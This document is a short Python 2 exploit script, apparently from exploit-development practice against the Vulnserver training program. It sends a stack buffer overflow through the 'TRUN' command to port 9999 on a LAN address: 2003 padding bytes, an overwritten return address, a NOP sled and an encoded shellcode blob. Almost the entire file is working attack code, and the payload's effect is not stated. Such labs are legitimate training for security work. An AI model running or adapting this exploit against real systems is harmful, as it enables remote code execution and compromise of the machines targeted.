#!/usr/bin/python
import sys, socket

shellcode = ("\xba\xd9\x87\x43\x1b\xd9\xee\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\x8f\x89\xa1\xee\xd3\x7e\xa7"
"\x11\x2b\x7f\xc8\x98\xce\x4e\xc8\xff\x9b\xe1\xf8\x74\xc9\x0d"
"\x72\xd8\xf9\x86\xf6\xf5\x0e\x2e\xbc\x23\x21\xaf\xed\x10\x20"
"\x33\xec\x44\x82\x0a\x3f\x99\xc3\x4b\x22\x50\x91\x04\x28\xc7"
"\x05\x20\x64\xd4\xae\x7a\x68\x5c\x53\xca\x8b\x4d\xc2\x40\xd2"
"\x4d\xe5\x85\x6e\xc4\xfd\xca\x4b\x9e\x76\x38\x27\x21\x5e\x70"
"\xc8\x8e\x9f\xbc\x3b\xce\xd8\x7b\xa4\xa5\x10\x78\x59\xbe\xe7"
"\x02\x85\x4b\xf3\xa5\x4e\xeb\xdf\x54\x82\x6a\x94\x5b\x6f\xf8"
"\xf2\x7f\x6e\x2d\x89\x84\xfb\xd0\x5d\x0d\xbf\xf6\x79\x55\x1b"
"\x96\xd8\x33\xca\xa7\x3a\x9c\xb3\x0d\x31\x31\xa7\x3f\x18\x5e"
"\x04\x72\xa2\x9e\x02\x05\xd1\xac\x8d\xbd\x7d\x9d\x46\x18\x7a"
"\xe2\x7c\xdc\x14\x1d\x7f\x1d\x3d\xda\x2b\x4d\x55\xcb\x53\x06"
"\xa5\xf4\x81\x89\xf5\x5a\x7a\x6a\xa5\x1a\x2a\x02\xaf\x94\x15"
"\x32\xd0\x7e\x3e\xd9\x2b\xe9\x81\xb6\x32\xeb\x69\xc5\x34\xfa"
"\x35\x40\xd2\x96\xd5\x04\x4d\x0f\x4f\x0d\x05\xae\x90\x9b\x60"
"\xf0\x1b\x28\x95\xbf\xeb\x45\x85\x28\x1c\x10\xf7\xff\x23\x8e"
"\x9f\x9c\xb6\x55\x5f\xea\xaa\xc1\x08\xbb\x1d\x18\xdc\x51\x07"
"\xb2\xc2\xab\xd1\xfd\x46\x70\x22\x03\x47\xf5\x1e\x27\x57\xc3"
"\x9f\x63\x03\x9b\xc9\x3d\xfd\x5d\xa0\x8f\x57\x34\x1f\x46\x3f"
"\xc1\x53\x59\x39\xce\xb9\x2f\xa5\x7f\x14\x76\xda\xb0\xf0\x7e"
"\xa3\xac\x60\x80\x7e\x75\x80\x63\xaa\x80\x29\x3a\x3f\x29\x34"
"\xbd\xea\x6e\x41\x3e\x1e\x0f\xb6\x5e\x6b\x0a\xf2\xd8\x80\x66"
"\x6b\x8d\xa6\xd5\x8c\x84")


overflow = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.1',9999))
    
    s.send(('TRUN /.:/' + overflow))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()
